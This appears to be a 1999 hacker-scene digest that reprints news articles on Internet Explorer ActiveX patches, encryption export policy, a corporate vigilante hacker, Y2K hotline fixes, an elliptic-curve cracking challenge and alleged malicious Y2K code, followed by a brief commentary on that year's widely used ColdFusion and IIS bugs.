      In the latest discovery, Microsoft identified eight ActiveX controls it said were "incorrectly marked as 'safe for scripting,'" a designation that assures users that they can download the controls without posing any security risk to their own computers. The controls could be manipulated for malicious ends, however, Microsoft said.
      The controls in question are Kodak Image Edit: Wang Imaging; Kodak Image Annotation: Wang Imaging; Kodak Image Scan: Wang Imaging; Kodak Thumbnail Image: Wang Imaging; Wang Image Admin: Wang Imaging; HHOpen: HTML help files; Registration Wizard: Internet Explorer Product Registration; and IE Active Setup: Internet Explorer Setup.
      Microsoft credited Bulgarian bug hunter Georgi Guninski with discovering the so-called ImportExportFavorites bug. Richard Smith of Pharlap Software and Australian bug hunter Shane Hird were recognized for discovering the ActiveX problems.
      
      
      Privacy Groups Wary Of Encryption Reforms                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Privacy groups and some lawmakers said Tuesday that they are concerned about legislation the Clinton administration has proposed that gives law enforcement potentially wider berth to access secure data to balance the relaxation of encryption-export controls.   
      Representatives from the Justice, Defense, and Commerce Departments and the White House briefed reporters and the Congressional Internet Caucus Advisory Committee, a bipartisan group of lawmakers, on the need to let law enforcement access encrypted material in criminal investigations.   The White House on Sept. 16 relaxed controls on data-scrambling products that are mass marketed to any country except those seven considered to support terrorism after a one-time technical review. The exact wording of the new regulation will be published by Dec. 15.   Industry praised the reforms because the about-face in the administration policy would let U.S. companies compete globally in strong encryption products. However, the reform package also includes draft legislation, the Cyberspace Electronic Security Act, that outlines when and how law enforcement may access secure data.  
       "We have deep concerns with the draft we've seen," said Jerry Berman, executive director of Center for Democracy and Technology, a privacy group here. The standards for court-ordered access to decryption keys and non-disclosure agreements protecting proprietary data gleaned in the course of investigations are ambiguous, he said. "The legislation should be written very clearly what sources and methods law enforcement and national security will use," Berman said.  
       The White House has sent the cyberspace security legislation to Capitol Hill and it can be introduced any time, he said. This legislation deserves many hearings and will originate in the Senate Judiciary Committee, Berman said.   
      The encryption reforms will move forward by Dec. 15 whether the controversial legislation has been passed or not, said Commerce Under Secretary William Reinsch, head of the Bureau of Export Administration.   Before the administration's lifting of encryption controls, legislation in the House of Representatives, the Security and Freedom Through Encryption, or SAFE Act, which would eliminate controls, was close to passage. "The administration's announcement doesn't let Congress off the hook. We still need legislation that provides permanent, significant guidelines for the FBI to get a key," said Sen. Patrick Leahy (D-Vt.), co-chair of the Internet caucus.   
      The author of the SAFE Act, Rep. Bob Goodlatte (R-Va.), said the bill, which enjoys broad congressional support, was ready for a full House vote. "Whether it goes depends on the details of the administration's rule," Goodlatte said.   
      The cyberspace security legislation will protect personal and industry privacy while also recognizing the serious problem of criminals hiding evidence, said Jim Robinson, Justice's assistant attorney general for the criminal division. The legislation gives special protections to those who deposit their decryption key with a third party, he said. "We will not let the public be left on the cutting floor," Robinson said. Peter Swire, the White House chief counsel for privacy called the cyberspace bill a tailored response to law enforcement. "We will get the rule down right," Swire said.
      
      
      
      Wild Wild Web                                                             ~~~~~~~~~~~~~
      Cybercrime units are overworked and understaffed, so many Netizens are taking matters into their own hands.
      You're a bank, and you think someone is trying to hack into your computer system. Where do you turn? Law enforcement offers little help - agencies are overworked and understaffed, and you risk public embarrassment if word gets out. 
      Apparently, there's another option. You might decide to take the law into your own hands. Which means you might call a man known as Lou Cipher. "Lou" says he's spent the last 10 years working for Fortune 500 companies, turning the tables on computer intruders, performing what some have called vigilante justice in cyberspace. 
      Cipher, a pseudonym, of his own choosing, says he retired from a 15-year career as a computer consultant in 1990. By then, he had already started his life as a hacker for hire. 
      In the past 10 years, he's says he's been hired over 50 times by big U.S. firms - mostly financial institutions - looking to get hackers off their back. He says fees now start at $100,000 for new clients, "with no promises of success." 
      He and his "associates" often take on their tasks by "bridging from the virtual world to the physical." That means breaking into the same computers a hacker has hijacked, chasing the trail through cyberspace, obtaining a real-world address and paying a real-life visit. 
      Cipher says he's even broken into homes and stolen hackers' computers to teach them a lesson. He gives the machines back after recovering any stolen information 
      "I am engaged in the protection and regaining of stolen assets because of the inability of government to provide adequate protection and prosecution," Cipher says. And that includes, he admits, breaking laws himself. His defense: "It's self-defense. 
      "You can call the FBI right now and say a person just got off with a database of customers. What is the FBI going to do?" 
      Giving Feds the fits                                                  The increase in technology crime has given fits to law enforcement agencies who find they don't have the necessary skills to keep up with an army of new criminals, emboldened by the anonymity the Net provides. Even when federal agents act, justice can be slow. It took almost six months for the recent nationwide FBI hacker "crackdown" to produce an arrest. 
      So Cipher, and some say other such corporate vigilantes, take the law into their own hands. 
      Still, to call breaking into someone else's home an act of corporate self-defense would likely be considered a stretch in court. 
      "I don't see that argument holding water," said cyberlaw expert Dorsey Morrow. "It would be a dangerous thing for a corporation to do. The potential liability is incredible." 
      Particularly if vigilantes hit the wrong target. That's the concern of computer consultant Brian Martin, who maintains the popular hacker information site "attrition.org." 
      "So Lou and his gang roll up on this house and know the intruder dialed from there. They bust in and terrorize an elderly couple. Oops!" Martin said. "How could they have been so wrong? Because the hacker used a laptop from the phone box outside their house. That scenario scares me." 
      First identified in a column                                      Cipher was first identified in public when information warfare expert Winn Schwartau used his name in a column for Network World in January. Claims of baseball bat-wielding vigilantes stirred skepticism in the underworld, and neither Martin nor Space Rogue, who maintains the Hacker News Network Web site, say they've ever heard of a hacker being visited by any private security agent. 
      "Considering the size of this community, if he has visited more than 10 people I am sure word would have leaked," Rogue said. But he added "There have been rumors floating around for a few years of corporations with their own internal security taking matters into their own hands." 
      That has law enforcement agencies anxious enough to discuss the matter publicly. Jim Christy, special agent for the Department of Defense, debated Schwartau on the topic at the Infowarcon conference earlier this month. 
      "I have no problem with identifying a bad guy and warning them," said Christy, who for 11 years was chief of computer crime for the Air Force Office of Special Investigations. "That's a legitimate self-defense option for a victim. But it crosses the line when you violate the rights of others. ... It crosses the line when you break the law." 
      Rely on informants                                                    He said the key to making law enforcement agencies more effective is for more victims of computer crime to come forward. Without a backlog of cases, agents can't demand additional resources. Companies that hire vigilantes, or who simply brush computer crime under the rug out of fear of embarrassment, only make the situation worse, he said. 
      But that won't help victims today, Schwartau said, and they need somewhere to turn. 
      "The legal community says it's blatantly illegal," Schwartau said. Schwartau, who once shared ownership of a Web site venture with Cipher, says the legal community is being closed-minded on the topic. "Is disarming an adversary illegal? ... You're allowed to do repossession, which is stealing your own possessions back." 
      When MSNBC visited Cipher at his daytime consulting job, where he is a security adviser for a large U.S. brokerage company, Cipher said he painstakingly verfies his targets and admits sometimes he doesn't catch them. Most of the examples he offered involved pre-emptive strikes against hackers "probing" financial networks - the cyber equivalent of "casing" a bank before a robbery. 
      Such pre-emptive strikes have taken him as far as Eastern Europe, and even India, he said. In one case, he said college-aged hackers in hte Czech Republic were worming their way toward a bank's credit card database. Another incident involved hackers in India trying to fake an electronic funds transfer. 
      But sometimes, he said, he does his work entirely over the Internet. Last month he says his agents broke into the computer of a man who held a vast database of stolen credit cards. They scrambled the card numbers to render them useless. 
      Many more of his stories are less dramatic, involving a polite curbside or coffeehouse conversation with a hacker. Often, that's enough, he says. 
      "They are very surprised when we come to visit, when we bridge to the physical world," he said.
      
      
      
      Desperate countdown to ready Cold War remnants for Y2K                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      All but one of the seven Cold War-era "hot lines" have year 2000 glitches, and the United States and Russia are hurrying to correct them, a top Pentagon official said today. 
      
      The Clinton administration is giving Moscow Y2K-compliant software and computers "to correct program deficiencies in outage reporting, monitoring, and channel reroute operations," assistant secretary of defense Edward Warner said. 
      
      He made the remarks in testimony prepared for the Senate Special Committee on Y2K. The panel is studying pitfalls of the coding glitch that could cause ill-prepared computers--and the operations they control--to fail on January 1 with the changeover from 1999 to 2000. 
      To avoid possible misunderstandings during the date change, the United States and Russia agreed on September 13 to set up a joint "Center for Y2K Strategic Stability" at Peterson Air Force Base in Colorado Springs, Colorado. 
      
      Sharing information                                                   In addition to sharing missile launch information, Russian and U.S. officers staffing the post will be able to talk through any other "defense-related problems that emerge" during the calendar rollover, Warner said. He said the Pentagon had begun the process of procuring updated equipment for the six of seven hot lines found to have problems, "and while the schedule is tight, we are confident that the fixes will be installed and tested by December." 
      
      "Assured communications between U.S. and Russian leaders is a priority at all times, and of particular concern over the millennium date change," said Warner, who is responsible for strategy and threat reduction. 
      
      The United States and Russia each keep roughly 2,500 nuclear-tipped missiles pointed at one another on hair-trigger alert despite the collapse of the old Soviet Union in December 1991, ending the Cold War. 
      Immediate communication
      
      They began installing the seven direct communications links, popularly known as hot lines, at the height of the Cold War in the 1960s to guarantee immediate communication when needed. 
      
      Among these are: direct links between the two presidents; a link between the secretary of state and the foreign minister; and one connecting nuclear risk-reduction center on both sides. A secure communications link also is key to operations of the temporary Center for Y2K Strategic Stability. 
      
      Russia put on hold most Y2K-related fixes and other technical cooperation with the United States after U.S.-led NATO forces began a 78-day air war in March in Yugoslavia, a Russian ally. 
      
      When talks resumed in August, Russia agreed with U.S. recommendations regarding "Y2K vulnerabilities in current hot line architecture," Warner said. 
      
      He said Y2K problems had been identified at a Russian ground station as well as in commercial software used on both sides, "which would prevent full operation of six of the seven direct communications links over the Y2K transition." 
      
      Among the contingency plans now being discussed were the possible addition of "backup analog circuits, additional secure phone/facsimile capability, and installation of emergency INMARSAT (mobile satellite communications) devices on both sides," Warner said. 
      
      Critical issues
      Another "critical" Y2K-related issue is the security of Russia's nuclear stockpiles, Warner told the committee headed by Utah Republican Robert Bennett and Connecticut Democrat Chris Dodd. 
      
      "Of special concern are the security systems in nuclear storage sites affecting access control, perimeter monitoring, fire detection and suppression, and warhead inventory and accountability," he said. 
      Forces of the 12th Main Directorate of the Russian Defense Ministry, responsible for the storage and security of non-deployed Russian nuclear warheads, are to maintain a "special Y2K monitoring and control center" at each of their 50 main nuclear storage sites in December through March 2000, Warner said. 
      
      Under its so-called Cooperative Threat Reduction program, the United States has spent millions of dollars since the end of the Cold War aimed at preventing Russian nuclear material from being purchased or stolen by guerrilla groups or third countries.
      
      
      
      
      Computer wizards crack code in worldwide challenge                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Computer wizards from 20 countries joined together to crack a high-powered secret code, winning a prestigious prize from a Canadian software firm seeking to establish a worldwide standard for encrypting data used in Internet transactions.
      A team led by Robert Harley, of France's National Institute for Research in Computer Science and Control (INRIA), won the five-thousand-dollar award after a 40-day effort to solve the puzzle, the firm Certicom said Wednesday.
      Harley coordinated a mammoth calculating programme that occupied 195 researchers in 20 countries, using 740 computers to run 130,000 billion computations, it said in a press release received here.
      The challenge centered on so-called "public key" cryptography.
      Under this, two computers that have never previously communicated agree on a joint key that will decipher coded data.
      The goal is to ensure that the key cannot be decoded, even if someone taps into the traffic -- thus ensuring that credit-card numbers and other data sent in electronic commerce cannot be intercepted and misused.
      Certicom's challenge related to a logarithmic programme, called elliptic curve cryptography (ECC), that it hopes to have established as an Internet standard for encrypted codes.
      It contends that ECC, a newcomer to the field, is more secure than more widely-used rival concepts, uses up less computer memory and gobbles up less bandwidth in the communications link.
      Specifically, cryptographers were asked to crack a 97-bit key that was encoded in ECC. They took twice as much computing power to achieve the goal as a 512-bit key in a rival encryption made by RSA Data Security, Certicom said.
      The result also showed that "strong security" can be achieved only when a much more powerful key -- a minimum of 163 bits in ECC code -- is used, Certicom said.
      The code-crackers included reseachers in Australia, Austria, Britain and the United States.
      They have agreed to donate 4,000 dollars of the prize money to the Free Software Foundation, an organisation that encourages the creation of free software.
      The remaining 1,000 dollars will go to an Australian member of the team, Paul Bourke, who made the breakthrough in the calculation. Bourke used computers at Australia's Swinburne University that are mainly used for studying pulsars. 
      
      
      
      U.S. finds malicious code changes in Y2K "fixes"                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Malicious changes to computer code under the guise of Year 2000 software fixes have begun to surface in some U.S. work undertaken by foreign contractors, the top U.S. cybercop said yesterday. 
      "We have some indications that this is happening" in a possible foreshadowing of economic and security headaches stemming from Y2K fixes, Michael Vatis of the Federal Bureau of Investigation told Reuters. 
      Vatis heads the interagency National Infrastructure Protection Center (NIPC), responsible for detecting and deterring cyberattacks on networks that drive U.S. finance, transport, telecommunications, and other vital sectors. 
      A Central Intelligence Agency officer assigned to the NIPC said recently that India and Israel appeared to be the "most likely sources of malicious remediation" of U.S. software. 
      "India and Israel appear to be the countries whose governments or industry may most likely use their access to implant malicious code in light of their assessed motive, opportunity, and means," the CIA officer, Terrill Maynard, wrote in the June issue of Infrastructure Protection Digest. 
      A significant amount of Y2K repair is also being done for U.S. companies by contractors in Ireland, Pakistan, and the Philippines, according to Maynard. But they appear among the "least likely" providers to jeopardize U.S. corporate or government system integrity, although the possibility cannot be ruled out, he wrote. 
      Thousands of companies in the United States and elsewhere have contracted out system upgrades to cope with the anticipated Y2K glitch, which could scramble computers when 1999 gives way to 2000. 
      The CIA declined to comment on Maynard's article. Referring to it, Vatis said, "This is our effort to [give] the public information that hopefully can be useful to people." 
      Vatis, interviewed at FBI headquarters, said that so far "not a great deal" of Y2K-related tampering had turned up. 
      "But that's largely because, No. 1, we're really dependent on private companies to tell us if they're seeing malicious code being implanted in their systems," he said. 
      In reporting evidence of possible Y2K-related sabotage of software, Vatis confirmed one of the worst long-term fears of U.S. national security planners. 
      "A tremendous amount of remediation of software has been done overseas or by foreign companies operating within the United States," Vatis said. 
      He said it was "quite easy" for an outsider to code in ways of gaining future access or causing something to "detonate" down the road. This could expose a company to future "denial of service attacks," open it to economic espionage, or leave it vulnerable to malicious altering of data, Vatis said. 
      The Senate Y2K Committee, in its final report last week, described the issue as "unsettling." 
      "The effort to fix the code may well introduce serious long-term risks to the nation's security and information superiority," said the panel headed by Sens. Robert Bennett (R-Utah) and Chris Dodd (D-Connecticut). 
      Vatis, in testimony before the Y2K panel in July, warned that contractors could compromise systems by installing "trap doors" for anonymous access. 
      By implanting malicious code, he said, a contractor could stitch in a "logic bomb" or a time-delayed virus that would later disrupt operations. Another possible threat is the insertion of a program that would compromise passwords or other system security, he said. 
      The Senate Y2K Committee said the long-term consequences could include increased foreign intelligence collection and espionage activity, reduced information security, a loss of economic advantage, and increased infrastructure vulnerability.
      
      
      
      
      financial firms create Net crime watch                                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      The Treasury Department, major banks, and investment firms today inaugurated an Internet crime watch center that's intended to share confidential information on cyberthreats to the financial industry. 
      The Financial Services Information Sharing and Analysis Center is intended to detect attacks from hackers and others on computer systems, and to provide rapid and anonymous notification between banks and other institutions when there is a threat. 
      "New types of crime require new types of solutions," Treasury Secretary Lawrence Summers said. 
      Citigroup, Bank of America, Merrill Lynch, J.P. Morgan, and mutual fund giants Vanguard and Fidelity are among the program participants. The firms are prohibited from sharing confidential customer information. 
      A survey by the Computer Security Institute found that 64 percent of the companies it questioned reported security breaches to computer systems in 1998, up from the number of firms reporting breaches in 1997, Summers said. 
      "As damaging as these attacks have been, the vast majority has been conducted by disgruntled individuals," Summers said. "We face a future, though, where criminals, terrorists, or even nation states may use the same tools in a more organized way for darker purposes." 
      President Bill Clinton, in an executive order issued in May 1998, directed the Treasury to pursue the project. The center itself is funded by the participating banks and financial institutions and managed by a private contractor. 
      Other federal agencies are participating in the effort. "This is a step in the right direction," said Arthur Levitt, chairman of the Securities & Exchange Commission. "It's a whole new world in terms of security." 
      The program will also help banks coordinate information during the Year 2000 computer rollover, according to Federal Reserve Governor Roger Ferguson. "The creation of the center couldn't come at a more opportune time," Ferguson said in a printed statement. 
      Last month, computer security product maker Network Associates warned that a computer virus that deletes a computer user's files was spreading through computer systems at major financial institutions. 
      The bug, dubbed the "Thursday" virus, is programmed to delete files on December 13, 1999, Network Associates said. The virus attacks Microsoft Windows Word 97 files. Users won't know they are infected until December 13, the company said. 
      The problem isn't restricted to the financial industry or the United States. Just today, Electrabel, Belgium's biggest electricity company, said it successfully warded off an attempt by a computer hacker to infiltrate its system. 
      Police are investigating the incident, which follows successful computer system break-ins in Belgium at Fortis Bank and at Belgacom's Skynet Internet service in August by a hacker who dubbed himself "Redattack." 
      
      
      
      
      
      SEC investigates NetRoadshow security breach                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Yahoo's NetRoadshow unit discovered a security breach that could have let unauthorized Internet users see information about securities offerings, drawing questions from regulators about the cause of the problem.
      NetRoadshow is a pioneer in the business of using the Internet to broadcast sessions that companies hold for institutional investors before stock and bond offerings. Only financial institutions and other sophisticated investors with passwords are supposed to have access to the online meetings, known as roadshows. 
      Until yesterday afternoon, however, anyone could view parts of sessions that the company has broadcast by entering the company's Web site through an Internet address that NetRoadshow's employees use to make technical changes to the site. 
      The company said the problem was caused by human error. About a dozen people had gotten into the system yesterday before NetRoadshow found out about the problem and blocked access, the company said. A Yahoo official said the company doesn't know how long the system had been open. 
      "The problem was resolved immediately yesterday when we found out about it," said Yahoo spokeswoman Sherry Manno. "The breach occurred in our system that receives transferred files and is structured for internal use, not the system investors use." 
      The Securities and Exchange Commission, which lays out rules for companies issuing stock and limits the audience of both traditional face-to-face road shows and online sessions, said it learned about the security breach yesterday and plans to talk to NetRoadshow about the issue. 
      "We're going to ask questions about what's going on," said SEC deputy corporation finance director Michael McAlevey. "If it was an inadvertent technical problem, it's less of a concern to us than if it was intentional." 
      SEC rules seek to prevent executives from hyping their business expectations before an offering or discussing the company beyond the information it has included in its prospectus, which is available to the public. The SEC allows road shows--where underwriters and issuers orally describe the company and try to build interest in the stock before pricing the offering--because they involve a limited audience of sophisticated investors. 
      The SEC gave its blessing to the Internet-transmitted road show in 1997, when the agency's staff sent "no action" letters to NetRoadshow and the MSNBC cable network, a joint venture of Microsoft and General Electric's NBC television network. They had requested approval to broadcast road shows over the Internet or via MSNBC's Private Financial Network. 
      The SEC said it wouldn't recommend charges for transmitting the sessions over the Internet, though the agency reserved the right to look at the issue again in the future. 
      In the July 30, 1997, letter to NetRoadshow, the SEC said: "Since regulatory responses to legal issues raised by technological developments may evolve, you should be aware that this no-action position may be reevaluated in the future." 
      NetRoadshow was acquired in March by Broadcast.com, which then was bought by Yahoo in July. 
      Bloomberg, the parent of Bloomberg News, competes with NetRoadshow and several other firms in the business of transmitting road show presentations. 
      
      
      
      
      Court to revisit encryption ruling                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     A U.S. federal appeals court will reexamine a trial court's decision to lift U.S. government restrictions on the export of encryption technology.  
      The 9th U.S. Circuit Court of Appeals withdrew a May decision by a panel of three of its judges, which had endorsed the trial court ruling. That indicates that a majority of the active 9th Circuit judges have reservations about the opinion or feel the encryption issue is significant enough to be revisited.  
      In May, the panel of 9th Circuit judges concluded that the federal government could not limit professor Daniel J. Bernstein's efforts to distribute encryption software. 
       Many companies, such as Network Associates, have been prevented by U.S. law from selling data-scrambling technology overseas.  
      Earlier this month, it was reported that the Clinton administration is easing restrictions on data-scrambling technology, clearing the way for Network Associates and other companies to sell the hardest-to-crack encryption technology.
      
      
      Microsoft Patches IE Security.....Again                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                             Latest fix eliminates ways that site operators can control your PC. 
      Microsoft claims to have really done it this time. The company promises that it has completely eliminated the security problems that existed with Internet Explorer with the release of an updated patch for the browser software.  
      An initial patch announcement was made on September 10, but the patch available as of late last week is more far-reaching, Microsoft said in a statement posted Friday on its security Web site.  
      The security holes in Internet Explorer were discovered earlier this month. The patch eliminates the "ImportExportFavorites" vulnerability, which affected computers connected to the Internet, Microsoft says.
      The security hole made it possible for a Web site operator to carry out any functions that visitors to a Web site could do on their own computers, such as deleting or modifying files or reformatting the hard drive. It derived from a feature in IE 5 that lets users export a list of their favorite Web sites to a file, or import a file with a list of favorite Web sites.  
      The new patch also plugs security holes that resulted from several ActiveX controls, Microsoft says. These existed both in versions 4.01 and 5 of Internet Explorer.  
      The ActiveX weakness allowed hackers to manipulate programs on a user's computer when they visited a Web page or received e-mail via Microsoft's Outlook program. 
      
      
      
      
      
      
      Justice Dept. Funds Antihacking Campaign                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      The Justice Department is trying to save children before they turn into hackers.   
      With its $300,000 funding of the Cybercitizen Partnership, an awareness campaign coordinated by the Information Technology Association of America, the Justice Department assumes the unusual role of helping to educate budding Web users about how to be responsible, law-abiding surfers.   
      The Cybercitizen Partnership, announced in March, is a joint Justice-ITAA effort aimed at protecting the country's Internet infrastructure from outlaw hackers and other criminals. Faced with a security breach, law enforcement officials don't know at first if they're confronting a foreign terrorist, a college student or a couple of sixth-graders who are having some fun with Dad's computer. But an ITAA official said that, upon investigation, a surprising number of cases involve child hackers.  
       The association says that information technology makes up about 6 percent of the global gross domestic product some $1.8 trillion of electronic infrastructure that needs to be protected against disgruntled former employees, corporate spies and juvenile delinquents who like to pull pranks.   
      Figuring that it's too late to reform terrorists and spies, the ITAA decided to concentrate on the kids. The campaign, which debuts in January, will initially target children 12 and under, aiming to teach them proper online behavior and to instill a healthy disdain for hacking. The association wants to "help weed out some of the less meaningful system violations by curious children so that law enforcement can focus on the true criminals," says ITAA President Harris Miller.  
       The cash infusion from the Justice Department is in keeping with a long tradition of government-sponsored public education campaigns, from the Interior Department's Smokey the Bear messages against forest fires to the Drug Enforcement Administration's "Just Say No" war on drugs.   Miller says the campaign could be expanded to educate kids about other aspects of proper Internet etiquette, such as warning them against sending spam for kids, the modern-day equivalent of prank telephone calls or visiting Web sites with adult content. The main focus of the campaign, however, will be to "send the message that hacking isn't cute, clever or funny." In addition to the funding from Justice, the ITAA also plans to pass the hat among its own membership, a who's-who list of the high-tech industry that includes Microsoft (MSFT) , America Online (AOL) and IBM (IBM) . The association will also seek funds from foundations and possibly from private individuals.  
      The association has sent out a request to several public relations companies for ideas on how to run the campaign, which might include television and Internet advertising, brochures and even visits to schools. One possibility under consideration: the creation of a mascot, like the famous McGruff crime dog, to pass the message along in a friendly manner. 
      
      
      
      Quantum confidential                                                       ~~~~~~~~~~~~~~~~~~~~
      Want to beat the hackers once and for all? As Simon Singh finds out, the enigmatic quantum world is about to make your secrets safe as houses
      IT COULD HAPPEN in a few months or a few years. But sooner or later, a mathematician could make a discovery that jeopardises international security, threatens the future of Internet commerce, and imperils the privacy of e-mails. Today's codes and ciphers are good, to be sure. But it is probably only a matter of time before they become useless. 
      With the coming of the information age, we rely ever more heavily on cryptography to protect us from snoopers, cyber-crooks and Big Brother. Some of today's most secure codes exploit the fact that while it is easy to multiply two prime numbers together, it is almost impossible to start with the answer and work out which two primes were used to create it. But the day a mathematical genius discovers a short cut for finding the hidden prime numbers, these codes will crumble. 
      What everyone is looking for is a new form of code, one that is truly unbreakable. That's where the quantum world comes in. Exploiting the strange uncertainties of quantum physics can give you a code that nobody--no matter how clever--will ever be able to crack. 
      That's the theory. The trouble comes when you try putting it into practice. When quantum particles interact with the large-scale world they tend to lose the delicate information they contain. This makes it fiendishly difficult to use them to send information over any sensible distance. Difficult, but not impossible. In the past few years, researchers have succeeded in sending quantum-encrypted messages tens of kilometres down optical fibres. Now the challenge is to find a way to send quantum-encrypted information through the air. This will open the way to fully secure global communications, beamed up to an orbiting satellite and forwarded to any place on Earth. It's a phenomenal technical problem, but this year researchers at the Los Alamos National Laboratory in New Mexico achieved a breakthrough that looks set to transform the way we keep our secrets. 
      
      
      
      Online Credit Card Security Fears Waning, But Still a Factor               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      A new report by Forrester Research, Inc. found that despite growing consumer comfort with online credit purchasing, the fear of using plastic on the Internet is still the largest obstacle to e-commerce. 
      According to the report, consumer worries about credit card security have been dropping since early 1998. Forrester examined this trend through three surveys: 120,000 households interviewed in early 1998, 95,000 households in early 1999 and 10,000 online households in July 1999. 
      Consumer Concern Has Fallen 
      In 1998, just 15 percent of online households felt safe using their credit cards for online purchases. In the most recent study, this number rose to 53 percent. Furthermore, the percentage of consumers who feel that the Internet is not a secure place to use a credit card has plummeted from 71 to 40 percent. 
      The survey also found that the longer consumers are online, the more comfortable they become with credit card security. However, this fact alone doesn't explain the waning security fears: 71 percent of consumers who were online for 6 to 12 months in January 1999 felt insecure using credit cards via the Internet. By July, this percentage dropped by 53 percent for consumers who were online for the same length of time. 
      Security Fears Still Choke E-Commerce 
      While security fears plummet, Forrester's survey found that 83 percent of consumers who have never shopped online still cite concerns over credit card security as the main reason for not buying online. 
      According to Forrester, these consumers are driven by a fear of technology snafus and untrustworthy e-tailers. The primary worry is that credit card information can be stolen during transmissions from a PC to an e-tailer. Additionally, 79 percent of those surveyed said that they didn't trust online merchants to safeguard this information -- while 53 percent feared giving their card numbers to e-tailers with no brick-and-mortar presence. 
      Nonetheless, general apprehension or bad experiences aren't entirely to blame. Forrester discovered that just 25 percent of skeptics say that they are generally wary when using a credit card for any type of purchase. A small group -- 4 percent -- points to a prior bad experience as the reason for not buying online. 
      How Can It Be Fixed? 
      Forrester asked reluctant consumers to identify what would make them more likely to use their credit cards online. After reviewing their answers, Forrester has come up with four ways that e-tailers can lessen consumers reluctance to shop online: 
      Seventy-five percent of the skeptics say that knowing they were using a "secure server site" would make them feel more comfortable. In addition, 48 percent would feel better if e-tailers also had some sort of brick-and-mortar presence to make returns easy. 
      Forty-one percent of those surveyed by Forrester said that they would like to see online merchants adopt a money-back guarantee before they would be willing to use their credit cards online. 
      Finally, 45 percent of the consumers interviewed said that their fears would be eased if e-tailers displayed positive testimonials from satisfied customers on their Web sites. 
      
      
      India: Code-Smuggling? Absurd                                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Indian officials Friday slammed as ridiculous a suggestion by US officials that Indian Y2K (Year 2000) software firms could have been used to smuggle in computer codes aimed at threatening Washington's security. 
      Michael Vatis, the top cyber cop in the Federal Bureau of Investigation, told Reuters Thursday that malicious code changes under the guise of Y2K modifications had begun to surface in some US work undertaken by foreign contractors. 
      The claim signaled possible economic and security threats. 
      Vatis, who heads the National Infrastructure Protection Center (NIPC), gave no details. But Terrill Maynard, a Central Intelligence Agency officer assigned to the NIPC, said in a recent article that India and Israel appeared to be the "most likely sources" of malicious code. 
      The article appeared in the June issue of Infrastructure Protection Digest. 
      "I think this is an utterly ridiculous assertion ... without, as far as I can see, any basis whatsoever," said Montek Singh Ahluwalia, chairman of the Indian government's Y2K Action Force. 
      "I have no idea if this report is factually correct and if indeed a responsible officer has made what appears to be an irresponsible statement," Ahluwalia told Reuters. 
      He said the Indian government had not received any official communication to suggest wrongdoing by Indian firms or agencies. 
      The CIA declined to comment on Maynard's article. Referring to it, Vatis said: "This is our effort to put out in the public information that hopefully can be useful to people." 
      Indian firms have done more than $2 billion worth of coding work to protect old computers whose date-fields denoted years only by the last two digits. Unless rectified, such computers can cause valuable data crashes when the year 2000 dawns. 
      India and Israel have had differences with the United States on security matters, particularly on nuclear policy. 
      Dewang Mehta, president of India's National Association of Software and Service Companies (NASSCOM), cited several reasons to dismiss suggestions Indian firms may be a security threat. 
      He told Reuters that too much was at stake for India's booming software companies, which have used Y2K as a strategy to gain long-term clients. Besides, Indian firms did the bulk of Y2K work at US sites under client supervision, he added. 
      "We cannot visualize that any moles have been planted. This is absurd. For us, too much is at stake," Mehta said. 
      He said Indian firms had also carried out "regression testing," which was aimed at ensuring Y2K programming work did not hamper other software in client systems. 
      Vatis said it was "quite easy" for an outsider to code in ways of gaining future access or causing something to "detonate" down the road. 
      This could expose a company to future "denial of service attacks," open it to economic espionage, or leave it vulnerable to malicious altering of data, he said. 
      Vatis said that so far "not a great deal" of Y2K-related tampering had turned up. But a US Senate panel said last week that long-term consequences of using foreign firms for Y2K work could include more espionage and reduced information security. 
      Mehta said he heard during a recent visit to Israel a rumor about a computer virus designed to wipe out Y2K solutions. 
      "I am afraid as only three months are left and many American systems are not compliant, this kind of global rumor-mongering is beginning to happen," he said. We all think we should guard ourselves against it. NASSCOM strongly condemns such rumors." 
      Maynard noted Ireland, Pakistan, and the Philippines among nations whose firms did significant Y2K repair. He said they were "least likely" to harm US systems but did not rule out threat possibilities.

      2. HACKING IN 1999 | THE CURRENT STATE OF HACKING
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Major Exploits released in 1999
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      In 1999, many things have happened, the allaire &lt;http://www.allaire.com> cold fusion bug has been widely advertised and put to use, many servers were compromised by using it, if you look to allot of the website defacement mirror sites, almost all were done by the cold fusion method. Yet another easy bug has been released in 1999 by eEye &lt;http://www.eEye.com> Digital Security Team, this bug was for the Microsoft &lt;http://www.microsoft.com> IIS server, and again many people have used this method to make a name for themselves. After looking at exploits like this, it makes you wonder what a hacker is these days? Someone who uses a web browser to hack remote systems? Or is a hacker still defined as it was originally. Hacking is mostly about gaining access to a remote system, not showing off that you outsmarted an admin.
      
      Major Incidents that have Affected the 'Scene'                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      The first major incident the busting of Eric Burns AKA Zyklon. When companies pressed lawsuits against him for thousands of dollars because he broke into their servers.Up to now he is still not allowed to touch a computer I assume.
